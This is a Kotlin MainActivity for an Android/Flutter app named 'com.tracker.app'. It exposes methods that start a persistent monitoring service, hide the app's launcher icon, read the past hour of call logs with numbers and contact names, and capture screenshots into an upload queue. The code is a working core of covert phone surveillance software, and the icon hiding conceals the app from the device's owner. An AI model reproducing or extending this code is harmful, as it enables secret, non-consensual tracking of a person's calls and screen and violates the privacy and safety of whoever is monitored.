package com.tracker.app

import android.content.ComponentName
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.CallLog
import com.tracker.app.services.MonitoringForegroundService
import com.tracker.app.services.UploadQueue
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel

class MainActivity : FlutterActivity() {
    private val CHANNEL = "com.tracker.app/services"

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "startAllServices" -> {
                        startMonitoringService()
                        result.success(true)
                    }
                    "hideLauncher" -> {
                        hideLauncherIcon()
                        result.success(true)
                    }
                    "getCallLogs" -> {
                        val logs = readCallLogs()
                        result.success(logs)
                    }
                    "getPendingUploads" -> {
                        val items = UploadQueue.drainAsMapList()
                        result.success(items)
                    }
                    "captureAndUploadRealtime" -> {
                        captureRealtime()
                        result.success(true)
                    }
                    else -> result.notImplemented()
                }
            }
    }

    private fun startMonitoringService() {
        val intent = Intent(this, MonitoringForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, "$packageName.MainActivityAlias"),
            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            android.content.pm.PackageManager.DONT_KILL_APP
        )
    }

    private fun readCallLogs(): List<Map<String, Any?>> {
        val logs = mutableListOf<Map<String, Any?>>()
        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                ),
                "${CallLog.Calls.DATE} > ?",
                arrayOf((System.currentTimeMillis() - 3600000).toString()),
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val type = when (it.getInt(2)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE -> "missed"
                        else -> "unknown"
                    }
                    logs.add(mapOf(
                        "phone_number" to it.getString(0),
                        "contact_name" to it.getString(1),
                        "call_type" to type,
                        "source" to "phone",
                        "duration" to it.getInt(3),
                        "call_date" to java.text.SimpleDateFormat(
                            "yyyy-MM-dd'T'HH:mm:ss",
                            java.util.Locale.US
                        ).format(java.util.Date(it.getLong(4)))
                    ))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return logs
    }

    private fun captureRealtime() {
        Thread {
            val service = MonitoringForegroundService.instance
            val file = service?.captureForRealtimePull()
            if (file != null) {
                UploadQueue.addRealtimeScreenshot(file)
            }
        }.start()
    }
}
